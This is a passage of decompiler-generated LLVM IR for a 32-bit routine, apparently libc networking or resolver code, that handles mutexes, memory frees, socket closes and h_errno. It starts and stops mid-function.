  %v2_8057865 = load i32, i32* %v1_8057865, align 4
  %v5_8057865 = inttoptr i32 %v0_805782f to i32*
  store i32 %v2_8057865, i32* %v5_8057865, align 4
  %v1_8057867 = call i32 @free(i32 -1)
  store i32 %v1_8057867, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80578de

dec_label_pc_805786e:                             ; preds = %dec_label_pc_8057859
  %v0_805786e = load i32, i32* @ebx, align 4
  %v1_8057870 = sub i32 -1, %v0_805786e
  store i32 %v1_8057870, i32* %eax.global-to-local, align 4
  %v2_8057872 = add i32 %v0_805782f, 120
  %v3_8057872 = inttoptr i32 %v2_8057872 to i32*
  %v4_8057872 = load i32, i32* %v3_8057872, align 4
  %v5_8057872 = add i32 %v4_8057872, %v1_8057870
  store i32 %v5_8057872, i32* %eax.global-to-local, align 4
  %v2_8057876 = add i32 %v0_805782c, 36
  %v3_8057876 = inttoptr i32 %v2_8057876 to i32*
  store i32 %v5_8057872, i32* %v3_8057876, align 4
  %v0_8057879 = load i32, i32* @edi, align 4
  %v1_8057879 = add i32 %v0_8057879, 16
  %v2_8057879 = inttoptr i32 %v1_8057879 to i32*
  %v3_8057879 = load i32, i32* %v2_8057879, align 4
  %v1_805787c = add i32 %v3_8057879, 4
  store i32 %v1_805787c, i32* %eax.global-to-local, align 4
  %v2_805787f = add i32 %v0_8057879, 36
  %v3_805787f = inttoptr i32 %v2_805787f to i32*
  %v4_805787f = load i32, i32* %v3_805787f, align 4
  %v7_805787f = mul i32 %v4_805787f, %v1_805787c
  store i32 %v7_805787f, i32* %eax.global-to-local, align 4
  %v2_8057883 = add i32 %v0_8057879, 32
  %v3_8057883 = inttoptr i32 %v2_8057883 to i32*
  %v4_8057883 = load i32, i32* %v3_8057883, align 4
  %v6_8057886 = icmp ugt i32 %v7_805787f, %v4_8057883
  br i1 %v6_8057886, label %dec_label_pc_805786e.dec_label_pc_80578f6.loopexit_crit_edge, label %dec_label_pc_8057888

dec_label_pc_805786e.dec_label_pc_80578f6.loopexit_crit_edge: ; preds = %dec_label_pc_805786e
  %v0_80578f6.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80578f6

dec_label_pc_8057888:                             ; preds = %dec_label_pc_805786e
  store i32 0, i32* %v3_805787f, align 4
  %v0_805788f = load i32, i32* @esp, align 4
  %v1_805788f = add i32 %v0_805788f, 27
  %v2_805788f = inttoptr i32 %v1_805788f to i8*
  store i8 0, i8* %v2_805788f, align 1
  %v1_80578e1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80578e1

dec_label_pc_8057896:                             ; preds = %dec_label_pc_80577f5
  %v1_8057899 = add i32 %v0_80577d6, 132
  %v2_8057899 = inttoptr i32 %v1_8057899 to i32*
  %v3_8057899 = load i32, i32* %v2_8057899, align 4
  %v6_8057899 = inttoptr i32 %v0_80577d6 to i32*
  store i32 %v3_8057899, i32* %v6_8057899, align 4
  %v1_80578a0 = call i32 @free(i32 -1)
  store i32 %v1_80578a0, i32* %eax.global-to-local, align 4
  %v0_80578a5 = load i32, i32* @esp, align 4
  %v1_80578a5 = add i32 %v0_80578a5, 16
  %v1_80578a8 = add i32 %v0_80578a5, 260
  %v2_80578a8 = inttoptr i32 %v1_80578a8 to i32*
  %v3_80578a8 = load i32, i32* %v2_80578a8, align 4
  store i32 %v3_80578a8, i32* %eax.global-to-local, align 4
  %v1_80578af = add i32 %v0_80578a5, 136
  %v2_80578af = inttoptr i32 %v1_80578af to i32*
  %v3_80578af = load i32, i32* %v2_80578af, align 4
  %v15_80578af = icmp eq i32 %v3_80578af, %v3_80578a8
  %v1_80578b3 = icmp eq i1 %v15_80578af, false
  br i1 %v1_80578b3, label %dec_label_pc_80578e1, label %dec_label_pc_80578b5

dec_label_pc_80578b5:                             ; preds = %dec_label_pc_8057896
  %v0_80578b5 = load i32, i32* @edi, align 4
  %v1_80578b5 = add i32 %v0_80578b5, 16
  %v2_80578b5 = inttoptr i32 %v1_80578b5 to i32*
  %v3_80578b5 = load i32, i32* %v2_80578b5, align 4
  store i32 %v3_80578b5, i32* %eax.global-to-local, align 4
  %v2_80578b8 = add i32 %v0_80578a5, 148
  %v3_80578b8 = inttoptr i32 %v2_80578b8 to i32*
  %v4_80578b8 = load i32, i32* %v3_80578b8, align 4
  %v15_80578b8 = icmp eq i32 %v3_80578b5, %v4_80578b8
  %v1_80578bf = icmp eq i1 %v15_80578b8, false
  br i1 %v1_80578bf, label %dec_label_pc_805797b, label %dec_label_pc_80578c5

dec_label_pc_80578c5:                             ; preds = %dec_label_pc_80578b5
  %v0_80578c5 = load i32, i32* @edx, align 4
  %v2_80578c5 = add i32 %v0_80578a5, 12
  %v3_80578c5 = inttoptr i32 %v2_80578c5 to i32*
  store i32 %v0_80578c5, i32* %v3_80578c5, align 4
  %v0_80578c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80578c6 = add i32 %v0_80578a5, 8
  %v3_80578c6 = inttoptr i32 %v2_80578c6 to i32*
  store i32 %v0_80578c6, i32* %v3_80578c6, align 4
  %v1_80578c7 = add i32 %v0_80578a5, 152
  %v2_80578c7 = inttoptr i32 %v1_80578c7 to i32*
  %v3_80578c7 = load i32, i32* %v2_80578c7, align 4
  %v5_80578c7 = add i32 %v0_80578a5, 4
  %v6_80578c7 = inttoptr i32 %v5_80578c7 to i32*
  store i32 %v3_80578c7, i32* %v6_80578c7, align 4
  %v0_80578ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80578ce = load i32, i32* @edi, align 4
  %v2_80578ce = add i32 %v1_80578ce, 36
  %v3_80578ce = inttoptr i32 %v2_80578ce to i32*
  %v4_80578ce = load i32, i32* %v3_80578ce, align 4
  %v7_80578ce = mul i32 %v4_80578ce, %v0_80578ce
  store i32 %v7_80578ce, i32* %eax.global-to-local, align 4
  %v2_80578d2 = add i32 %v1_80578ce, 28
  %v3_80578d2 = inttoptr i32 %v2_80578d2 to i32*
  %v4_80578d2 = load i32, i32* %v3_80578d2, align 4
  %v5_80578d2 = add i32 %v4_80578d2, %v7_80578ce
  store i32 %v5_80578d2, i32* %eax.global-to-local, align 4
  %v3_80578d5 = inttoptr i32 %v0_80578a5 to i32*
  store i32 %v5_80578d2, i32* %v3_80578d5, align 4
  %v5_80578d6 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v5_80578d6, i32* %eax.global-to-local, align 4
  %v0_80578db = load i32, i32* @edi, align 4
  %v1_80578db = add i32 %v0_80578db, 36
  %v2_80578db = inttoptr i32 %v1_80578db to i32*
  %v3_80578db = load i32, i32* %v2_80578db, align 4
  %v4_80578db = add i32 %v3_80578db, 1
  store i32 %v4_80578db, i32* %v2_80578db, align 4
  br label %dec_label_pc_80578de

dec_label_pc_80578de:                             ; preds = %dec_label_pc_8057862, %dec_label_pc_80578c5
  %v0_80578de = load i32, i32* @esp, align 4
  %v1_80578de = add i32 %v0_80578de, 16
  br label %dec_label_pc_80578e1

dec_label_pc_80578e1:                             ; preds = %dec_label_pc_8057896, %dec_label_pc_8057888, %dec_label_pc_80578de
  %v1_80578e1 = phi i32 [ %v1_80578a5, %dec_label_pc_8057896 ], [ %v1_80578e1.pre, %dec_label_pc_8057888 ], [ %v1_80578de, %dec_label_pc_80578de ]
  %v0_80578e1 = load i32, i32* @esi, align 4
  %v2_80578e1 = add i32 %v1_80578e1, 52
  %v3_80578e1 = inttoptr i32 %v2_80578e1 to i32*
  %v4_80578e1 = load i32, i32* %v3_80578e1, align 4
  %v5_80578e1 = add i32 %v4_80578e1, %v0_80578e1
  store i32 %v5_80578e1, i32* @esi, align 4
  %v0_80578e5 = load i32, i32* @ebx, align 4
  %v1_80578e5 = add i32 %v0_80578e5, 1
  store i32 %v1_80578e5, i32* @ebx, align 4
  %v2_80578e6 = add i32 %v1_80578e1, 104
  %v3_80578e6 = inttoptr i32 %v2_80578e6 to i32*
  %v4_80578e6 = load i32, i32* %v3_80578e6, align 4
  %v5_80578e6 = sub i32 %v1_80578e5, %v4_80578e6
  %v11_80578e6 = xor i32 %v4_80578e6, %v1_80578e5
  %v12_80578e6 = xor i32 %v5_80578e6, %v1_80578e5
  %v13_80578e6 = and i32 %v12_80578e6, %v11_80578e6
  %v14_80578e6 = icmp slt i32 %v13_80578e6, 0
  %v16_80578e6 = icmp slt i32 %v5_80578e6, 0
  %v2_80578ea = icmp eq i1 %v16_80578e6, %v14_80578e6
  br i1 %v2_80578ea, label %dec_label_pc_80578f6, label %dec_label_pc_80578ec

dec_label_pc_80578ec:                             ; preds = %dec_label_pc_80578ec.lr.ph, %dec_label_pc_80578e1
  %v0_80578ec = phi i32 [ %v0_80578ec.pre, %dec_label_pc_80578ec.lr.ph ], [ %v5_80578e1, %dec_label_pc_80578e1 ]
  %v0_80577c285 = phi i32 [ %v1_80578e6.pre, %dec_label_pc_80578ec.lr.ph ], [ %v1_80578e1, %dec_label_pc_80578e1 ]
  %v2_80578ec = add i32 %v0_80577c285, 16
  %v3_80578ec = inttoptr i32 %v2_80578ec to i32*
  %v4_80578ec = load i32, i32* %v3_80578ec, align 4
  %v5_80578ec = sub i32 %v0_80578ec, %v4_80578ec
  %v11_80578ec = xor i32 %v4_80578ec, %v0_80578ec
  %v12_80578ec = xor i32 %v5_80578ec, %v0_80578ec
  %v13_80578ec = and i32 %v12_80578ec, %v11_80578ec
  %v14_80578ec = icmp slt i32 %v13_80578ec, 0
  %v16_80578ec = icmp slt i32 %v5_80578ec, 0
  %v2_80578f0 = icmp eq i1 %v16_80578ec, %v14_80578ec
  br i1 %v2_80578f0, label %dec_label_pc_80578f6, label %dec_label_pc_80577c2

dec_label_pc_80578f6:                             ; preds = %dec_label_pc_80577e5, %dec_label_pc_80577b6, %dec_label_pc_80578e1, %dec_label_pc_8057837, %dec_label_pc_805784b, %dec_label_pc_80578ec, %dec_label_pc_805786e.dec_label_pc_80578f6.loopexit_crit_edge
  %v0_80578f6 = phi i32 [ %v0_80578f6.pre.pre, %dec_label_pc_805786e.dec_label_pc_80578f6.loopexit_crit_edge ], [ %v1_80578e6.pre, %dec_label_pc_80577b6 ], [ %v1_80578e1, %dec_label_pc_80578e1 ], [ %v1_805782f, %dec_label_pc_8057837 ], [ %v1_805782f, %dec_label_pc_805784b ], [ %v0_80577c285, %dec_label_pc_80578ec ], [ %v1_80577d6, %dec_label_pc_80577e5 ]
  %v1_80578f9 = add i32 %v0_80578f6, 20
  %v2_80578f9 = inttoptr i32 %v1_80578f9 to i32*
  %v3_80578f9 = load i32, i32* %v2_80578f9, align 4
  %v5_80578f9 = add i32 %v0_80578f6, -16
  %v6_80578f9 = inttoptr i32 %v5_80578f9 to i32*
  store i32 %v3_80578f9, i32* %v6_80578f9, align 4
  %v1_80578fd = call i32 @__libc_close(i32 -1)
  store i32 %v1_80578fd, i32* %eax.global-to-local, align 4
  %v0_8057902 = load i32, i32* @esp, align 4
  %v1_8057905 = add i32 %v0_8057902, 272
  %v2_8057905 = inttoptr i32 %v1_8057905 to i32*
  %v3_8057905 = load i32, i32* %v2_8057905, align 4
  %v4_8057905 = icmp eq i32 %v3_8057905, 0
  br i1 %v4_8057905, label %dec_label_pc_805791a, label %dec_label_pc_805790f

dec_label_pc_805790f:                             ; preds = %dec_label_pc_80578f6
  store i32 %v3_8057905, i32* %edx.global-to-local, align 4
  %v2_8057916 = inttoptr i32 %v3_8057905 to i32*
  store i32 %v2_8057386, i32* %v2_8057916, align 4
  %v0_8057926.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057926

dec_label_pc_805791a:                             ; preds = %dec_label_pc_80578f6
  %v3_805791d = inttoptr i32 %v0_8057902 to i32*
  store i32 %v2_8057386, i32* %v3_805791d, align 4
  %v1_805791e = call i32 @free(i32 -1)
  store i32 %v1_805791e, i32* %eax.global-to-local, align 4
  %v0_8057923 = load i32, i32* @esp, align 4
  %v1_8057923 = add i32 %v0_8057923, 16
  br label %dec_label_pc_8057926

dec_label_pc_8057926:                             ; preds = %dec_label_pc_805790f, %dec_label_pc_805791a
  %v0_8057926 = phi i32 [ %v0_8057926.pre, %dec_label_pc_805790f ], [ %v1_8057923, %dec_label_pc_805791a ]
  %v1_8057929 = add i32 %v0_8057926, 12
  %v2_8057929 = inttoptr i32 %v1_8057929 to i32*
  %v3_8057929 = load i32, i32* %v2_8057929, align 4
  %v5_8057929 = add i32 %v0_8057926, -16
  %v6_8057929 = inttoptr i32 %v5_8057929 to i32*
  store i32 %v3_8057929, i32* %v6_8057929, align 4
  %v1_805792d = call i32 @free(i32 -1)
  store i32 %v1_805792d, i32* %eax.global-to-local, align 4
  %v0_8057932 = load i32, i32* @esp, align 4
  %v1_8057935 = add i32 %v0_8057932, 8
  %v2_8057935 = inttoptr i32 %v1_8057935 to i32*
  store i32 ptrtoint (i8** @global_var_80673e0.316 to i32), i32* %v2_8057935, align 4
  %v1_805793a = add i32 %v0_8057932, 4
  %v2_805793a = inttoptr i32 %v1_805793a to i32*
  store i32 134540701, i32* %v2_805793a, align 4
  %v1_805793f = add i32 %v0_8057932, 200
  store i32 %v1_805793f, i32* @ebx, align 4
  %v3_8057946 = inttoptr i32 %v0_8057932 to i32*
  store i32 %v1_805793f, i32* %v3_8057946, align 4
  %v5_8057947 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v5_8057947, i32* %eax.global-to-local, align 4
  %v0_805794c = load i32, i32* @esp, align 4
  %v1_805794c = inttoptr i32 %v0_805794c to i32*
  store i32 ptrtoint (i8** @global_var_80673e0.316 to i32), i32* %v1_805794c, align 4
  %v1_8057953 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8057953, i32* %eax.global-to-local, align 4
  %v0_8057958 = load i32, i32* @esp, align 4
  %v1_8057958 = add i32 %v0_8057958, 56
  %v2_8057958 = inttoptr i32 %v1_8057958 to i32*
  %v3_8057958 = load i32, i32* %v2_8057958, align 4
  store i32 %v3_8057958, i32* %eax.global-to-local, align 4
  %v1_805795c = add i32 %v0_8057958, 72
  %v2_805795c = inttoptr i32 %v1_805795c to i32*
  %v3_805795c = load i32, i32* %v2_805795c, align 4
  store i32 %v3_805795c, i32* %edx.global-to-local, align 4
  %v1_8057960 = inttoptr i32 %v0_8057958 to i32*
  %v3_8057960 = add i32 %v0_8057958, 4
  %v1_8057961 = inttoptr i32 %v3_8057960 to i32*
  %v2_8057961 = load i32, i32* %v1_8057961, align 4
  store i32 %v2_8057961, i32* @edi, align 4
  store i32 1, i32* %v1_8057961, align 4
  %v0_8057964 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057964 = sext i32 %v0_8057964 to i64
  store i64 %v1_8057964, i64* @global_var_80673f8.317, align 8
  %v0_8057969 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057969 = trunc i32 %v0_8057969 to i16
  store i16 %v1_8057969, i16* @global_var_8062a44.318, align 4
  %v0_8057970 = load i32, i32* @ebx, align 4
  store i32 %v0_8057970, i32* %v1_8057960, align 4
  %v3_8057971 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8057414)
  store i32 %v3_8057971, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057ab2

dec_label_pc_805797b:                             ; preds = %dec_label_pc_80578b5
  %v1_805797e = inttoptr i32 %v0_80578b5 to i32*
  %v2_805797e = load i32, i32* %v1_805797e, align 4
  %v5_805797e = inttoptr i32 %v0_80578a5 to i32*
  store i32 %v2_805797e, i32* %v5_805797e, align 4
  %v1_8057980 = call i32 @free(i32 -1)
  store i32 %v1_8057980, i32* %eax.global-to-local, align 4
  %v0_8057985 = load i32, i32* @esp, align 4
  %v1_8057985 = add i32 %v0_8057985, 16
  br label %dec_label_pc_8057988

dec_label_pc_8057988:                             ; preds = %dec_label_pc_80576ba, %dec_label_pc_80577e5, %dec_label_pc_80577dd, %dec_label_pc_8057779, %dec_label_pc_80576ff, %dec_label_pc_80576db, %dec_label_pc_805797b
  %v1_805798f = phi i32 [ %v1_80576cf, %dec_label_pc_80576ba ], [ %v1_80577d6, %dec_label_pc_80577e5 ], [ %v1_80577d6, %dec_label_pc_80577dd ], [ %v1_80576f0, %dec_label_pc_8057779 ], [ %v1_80576f0, %dec_label_pc_80576ff ], [ %v1_80576f0, %dec_label_pc_80576db ], [ %v1_8057985, %dec_label_pc_805797b ]
  %v1_8057988 = add i32 %v1_805798f, 51
  %v2_8057988 = inttoptr i32 %v1_8057988 to i8*
  %v3_8057988 = load i8, i8* %v2_8057988, align 1
  %v4_8057988 = icmp eq i8 %v3_8057988, 0
  %v1_805798d = icmp eq i1 %v4_8057988, false
  br i1 %v1_805798d, label %dec_label_pc_80579d3, label %dec_label_pc_805798f

dec_label_pc_805798f:                             ; preds = %dec_label_pc_8057988
  %v0_805798f = load i32, i32* @ecx, align 4
  %v2_805798f = add i32 %v1_805798f, -4
  %v3_805798f = inttoptr i32 %v2_805798f to i32*
  store i32 %v0_805798f, i32* %v3_805798f, align 4
  %v1_8057990 = add i32 %v1_805798f, -8
  %v2_8057990 = inttoptr i32 %v1_8057990 to i32*
  store i32 ptrtoint (i32* @global_var_8062a48.233 to i32), i32* %v2_8057990, align 4
  %v1_8057995 = add i32 %v1_805798f, -12
  %v2_8057995 = inttoptr i32 %v1_8057995 to i32*
  store i32 134540701, i32* %v2_8057995, align 4
  %v1_805799a = add i32 %v1_805798f, 184
  store i32 %v1_805799a, i32* @esi, align 4
  %v2_80579a1 = add i32 %v1_805798f, -16
  %v3_80579a1 = inttoptr i32 %v2_80579a1 to i32*
  store i32 %v1_805799a, i32* %v3_80579a1, align 4
  %v5_80579a2 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v5_80579a2, i32* %eax.global-to-local, align 4
  %v0_80579a7 = load i32, i32* @esp, align 4
  %v1_80579a7 = inttoptr i32 %v0_80579a7 to i32*
  store i32 ptrtoint (i32* @global_var_8062a48.233 to i32), i32* %v1_80579a7, align 4
  %v1_80579ae = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_80579ae, i32* %eax.global-to-local, align 4
  %v0_80579b3 = load i32, i32* @esp, align 4
  %v1_80579b3 = inttoptr i32 %v0_80579b3 to i32*
  %v2_80579b3 = load i32, i32* %v1_80579b3, align 4
  store i32 %v2_80579b3, i32* %eax.global-to-local, align 4
  %v3_80579b3 = add i32 %v0_80579b3, 4
  %v1_80579b4 = inttoptr i32 %v3_80579b3 to i32*
  %v2_80579b4 = load i32, i32* %v1_80579b4, align 4
  store i32 %v2_80579b4, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80579b4, align 4
  %v0_80579b7 = load i32, i32* @esi, align 4
  store i32 %v0_80579b7, i32* %v1_80579b3, align 4
  %v0_80579b8 = load i32, i32* @global_var_8067ac4.319, align 4
  store i32 %v0_80579b8, i32* @ebx, align 4
  %v3_80579be = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8057414)
  store i32 %v3_80579be, i32* %eax.global-to-local, align 4
  %v0_80579c3 = load i32, i32* @esp, align 4
  %v1_80579c3 = add i32 %v0_80579c3, 16
  %v0_80579c6 = load i32, i32* @ebx, align 4
  %v1_80579c6 = add i32 %v0_80579c6, -1
  store i32 %v1_80579c6, i32* @ebx, align 4
  %v1_80579c7 = add i32 %v0_80579c3, 52
  %v2_80579c7 = inttoptr i32 %v1_80579c7 to i32*
  %v3_80579c7 = load i32, i32* %v2_80579c7, align 4
  %v5_80579c7 = sub i32 %v3_80579c7, %v1_80579c6
  %v11_80579c7 = xor i32 %v3_80579c7, %v1_80579c6
  %v12_80579c7 = xor i32 %v5_80579c7, %v3_80579c7
  %v13_80579c7 = and i32 %v12_80579c7, %v11_80579c7
  %v14_80579c7 = icmp slt i32 %v13_80579c7, 0
  %v16_80579c7 = icmp slt i32 %v5_80579c7, 0
  %v2_80579cb = icmp eq i1 %v16_80579c7, %v14_80579c7
  br i1 %v2_80579cb, label %dec_label_pc_80579d3, label %dec_label_pc_80579cd

dec_label_pc_80579cd:                             ; preds = %dec_label_pc_805798f
  %v4_80579cd = add i32 %v3_80579c7, 1
  store i32 %v4_80579cd, i32* %v2_80579c7, align 4
  br label %dec_label_pc_80579f4.backedge

dec_label_pc_80579d3:                             ; preds = %dec_label_pc_805765c, %dec_label_pc_805798f, %dec_label_pc_8057988, %dec_label_pc_8057673
  %v1_80579e0 = phi i32 [ %v1_80579c3, %dec_label_pc_805798f ], [ %v1_805798f, %dec_label_pc_8057988 ], [ %v1_80576af, %dec_label_pc_8057673 ], [ %v0_80579d3.pre, %dec_label_pc_805765c ]
  %v1_80579d3 = add i32 %v1_80579e0, 40
  %v2_80579d3 = inttoptr i32 %v1_80579d3 to i32*
  %v3_80579d3 = load i32, i32* %v2_80579d3, align 4
  %v1_80579d7 = add i32 %v3_80579d3, 1
  store i32 %v1_80579d7, i32* %eax.global-to-local, align 4
  %v1_80579d8 = ashr i32 %v1_80579d7, 31
  store i32 %v1_80579d8, i32* %edx.global-to-local, align 4
  %v1_80579d9 = add i32 %v1_80579e0, 248
  %v2_80579d9 = inttoptr i32 %v1_80579d9 to i32*
  %v3_80579d9 = load i32, i32* %v2_80579d9, align 4
  %v5_80579d9 = zext i32 %v1_80579d7 to i64
  %v7_80579d9 = zext i32 %v1_80579d8 to i64
  %v8_80579d9 = mul nuw i64 %v7_80579d9, 4294967296
  %v9_80579d9 = or i64 %v8_80579d9, %v5_80579d9
  %v10_80579d9 = zext i32 %v3_80579d9 to i64
  %v11_80579d9 = sdiv i64 %v9_80579d9, %v10_80579d9
  %v12_80579d9 = trunc i64 %v11_80579d9 to i32
  store i32 %v12_80579d9, i32* %eax.global-to-local, align 4
  %v13_80579d9 = srem i64 %v9_80579d9, %v10_80579d9
  %v14_80579d9 = trunc i64 %v13_80579d9 to i32
  store i32 %v14_80579d9, i32* %edx.global-to-local, align 4
  store i32 %v14_80579d9, i32* %v2_80579d3, align 4
  %v1_80579e4 = icmp eq i32 %v14_80579d9, 0
  %v1_80579e6 = icmp eq i1 %v1_80579e4, false
  br i1 %v1_80579e6, label %dec_label_pc_80579ec, label %dec_label_pc_80579e8

dec_label_pc_80579e8:                             ; preds = %dec_label_pc_80579d3
  %v0_80579e8 = load i32, i32* @esp, align 4
  %v1_80579e8 = add i32 %v0_80579e8, 28
  %v2_80579e8 = inttoptr i32 %v1_80579e8 to i32*
  %v3_80579e8 = load i32, i32* %v2_80579e8, align 4
  %v4_80579e8 = add i32 %v3_80579e8, 1
  store i32 %v4_80579e8, i32* %v2_80579e8, align 4
  br label %dec_label_pc_80579ec

dec_label_pc_80579ec:                             ; preds = %dec_label_pc_80579d3, %dec_label_pc_80579e8
  %v0_80579ec = load i32, i32* @esp, align 4
  %v1_80579ec = add i32 %v0_80579ec, 36
  %v2_80579ec = inttoptr i32 %v1_80579ec to i32*
  store i32 -1, i32* %v2_80579ec, align 4
  br label %dec_label_pc_80579f4.backedge

dec_label_pc_80579f4.backedge:                    ; preds = %dec_label_pc_80579ec, %dec_label_pc_805766a, %dec_label_pc_8057758, %dec_label_pc_80579cd
  %v0_80579f4.pre = load i32, i32* @esp, align 4
  %v1_80579f4 = add i32 %v0_80579f4.pre, 28
  %v2_80579f4 = inttoptr i32 %v1_80579f4 to i32*
  %v3_80579f4 = load i32, i32* %v2_80579f4, align 4
  %tmp127 = icmp ult i32 %v3_80579f4, 3
  br i1 %tmp127, label %dec_label_pc_8057454, label %dec_label_pc_8057a19

dec_label_pc_8057a19:                             ; preds = %dec_label_pc_80573ce, %dec_label_pc_805746a, %dec_label_pc_805755e, %dec_label_pc_80579f4.backedge, %entry, %dec_label_pc_80573a8, %dec_label_pc_80573b0, %dec_label_pc_80573be
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_80573be ], [ -1, %dec_label_pc_80573b0 ], [ -1, %dec_label_pc_80573a8 ], [ -1, %entry ], [ %v0_805741b, %dec_label_pc_80579f4.backedge ], [ %v0_805741b, %dec_label_pc_805755e ], [ %v0_805741b, %dec_label_pc_805746a ], [ %v0_805741b, %dec_label_pc_80573ce ]
  %v0_8057a19 = call i32 @__GI___h_errno_location()
  store i32 %v0_8057a19, i32* %eax.global-to-local, align 4
  %v1_8057a1e = inttoptr i32 %v0_8057a19 to i32*
  store i32 -1, i32* %v1_8057a1e, align 4
  %v0_8057a24 = load i32, i32* @esp, align 4
  %v1_8057a24 = add i32 %v0_8057a24, 44
  %v2_8057a24 = inttoptr i32 %v1_8057a24 to i32*
  %v3_8057a24 = load i32, i32* %v2_8057a24, align 4
  store i32 %v3_8057a24, i32* %eax.global-to-local, align 4
  %v2_8057a28 = add i32 %v0_8057a24, 56
  %v3_8057a28 = inttoptr i32 %v2_8057a28 to i32*
  store i32 %v3_8057a24, i32* %v3_8057a28, align 4
  br label %dec_label_pc_8057a2c

dec_label_pc_8057a2c:                             ; preds = %dec_label_pc_8057791, %dec_label_pc_8057769, %dec_label_pc_8057a19
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8057a19 ], [ %v0_805741b, %dec_label_pc_8057791 ], [ %v0_805741b, %dec_label_pc_8057769 ]
  %v0_8057a2c = load i32, i32* @esp, align 4
  %v1_8057a2c = add i32 %v0_8057a2c, 20
  %v2_8057a2c = inttoptr i32 %v1_8057a2c to i32*
  %v3_8057a2c = load i32, i32* %v2_8057a2c, align 4
  %v13_8057a2c = icmp eq i32 %v3_8057a2c, -1
  br i1 %v13_8057a2c, label %dec_label_pc_8057a2c.dec_label_pc_8057a42_crit_edge, label %dec_label_pc_8057a33

dec_label_pc_8057a2c.dec_label_pc_8057a42_crit_edge: ; preds = %dec_label_pc_8057a2c
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8057a42

dec_label_pc_8057a33:                             ; preds = %dec_label_pc_8057a2c
  %v3_8057a36 = load i32, i32* %v2_8057a2c, align 4
  %v5_8057a36 = add i32 %v0_8057a2c, -16
  %v6_8057a36 = inttoptr i32 %v5_8057a36 to i32*
  store i32 %v3_8057a36, i32* %v6_8057a36, align 4
  %v1_8057a3a = sext i16 %stack_var_-192.1 to i32
  %v2_8057a3a = call i32 @__libc_close(i32 %v1_8057a3a)
  store i32 %v2_8057a3a, i32* %eax.global-to-local, align 4
  %v0_8057a3f = load i32, i32* @esp, align 4
  %v1_8057a3f = add i32 %v0_8057a3f, 16
  br label %dec_label_pc_8057a42

dec_label_pc_8057a42:                             ; preds = %dec_label_pc_8057a2c.dec_label_pc_8057a42_crit_edge, %dec_label_pc_8057a33
  %v1_8057a49.pre-phi = phi i32 [ %.pre, %dec_label_pc_8057a2c.dec_label_pc_8057a42_crit_edge ], [ %v1_8057a3a, %dec_label_pc_8057a33 ]
  %v0_8057a42 = phi i32 [ %v0_8057a2c, %dec_label_pc_8057a2c.dec_label_pc_8057a42_crit_edge ], [ %v1_8057a3f, %dec_label_pc_8057a33 ]
  %v1_8057a45 = add i32 %v0_8057a42, 12
  %v2_8057a45 = inttoptr i32 %v1_8057a45 to i32*
  %v3_8057a45 = load i32, i32* %v2_8057a45, align 4
  %v5_8057a45 = add i32 %v0_8057a42, -16
  %v6_8057a45 = inttoptr i32 %v5_8057a45 to i32*
  store i32 %v3_8057a45, i32* %v6_8057a45, align 4
  %v2_8057a49 = call i32 @free(i32 %v1_8057a49.pre-phi)
  store i32 %v2_8057a49, i32* %eax.global-to-local, align 4
  %v1_8057a4e = load i32, i32* @esp, align 4
  %v2_8057a4e = inttoptr i32 %v1_8057a4e to i32*
  store i32 %v2_8057386, i32* %v2_8057a4e, align 4
  %v2_8057a51 = call i32 @free(i32 %v1_8057a49.pre-phi)
  store i32 %v2_8057a51, i32* %eax.global-to-local, align 4
  %v0_8057a56 = load i32, i32* @esp, align 4
  %v1_8057a59 = add i32 %v0_8057a56, 32
  %v2_8057a59 = inttoptr i32 %v1_8057a59 to i32*
  store i32 -1, i32* %v2_8057a59, align 4
  %v0_8057a61 = load i32, i32* @esp, align 4
  %v1_8057a61 = add i32 %v0_8057a61, 40
  %v2_8057a61 = inttoptr i32 %v1_8057a61 to i32*
  %v3_8057a61 = load i32, i32* %v2_8057a61, align 4
  %v13_8057a61 = icmp eq i32 %v3_8057a61, -1
  br i1 %v13_8057a61, label %dec_label_pc_8057ab5, label %dec_label_pc_8057a68

dec_label_pc_8057a68:                             ; preds = %dec_label_pc_8057a42
  %v0_8057a68 = load i32, i32* @ecx, align 4
  %v2_8057a68 = add i32 %v0_8057a61, -4
  %v3_8057a68 = inttoptr i32 %v2_8057a68 to i32*
  store i32 %v0_8057a68, i32* %v3_8057a68, align 4
  %v1_8057a69 = add i32 %v0_8057a61, -8
  %v2_8057a69 = inttoptr i32 %v1_8057a69 to i32*
  store i32 ptrtoint (i8** @global_var_80673e0.316 to i32), i32* %v2_8057a69, align 4
  %v1_8057a6e = add i32 %v0_8057a61, -12
  %v2_8057a6e = inttoptr i32 %v1_8057a6e to i32*
  store i32 134540701, i32* %v2_8057a6e, align 4
  %v1_8057a73 = add i32 %v0_8057a61, 184
  store i32 %v1_8057a73, i32* @ebx, align 4
  %v2_8057a7a = add i32 %v0_8057a61, -16
  %v3_8057a7a = inttoptr i32 %v2_8057a7a to i32*
  store i32 %v1_8057a73, i32* %v3_8057a7a, align 4
  %v4_8057a7b = inttoptr i32 %v1_8057a49.pre-phi to i32*
  %v5_8057a7b = call i32 @__pthread_cleanup_push_defer(i32* %v4_8057a7b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
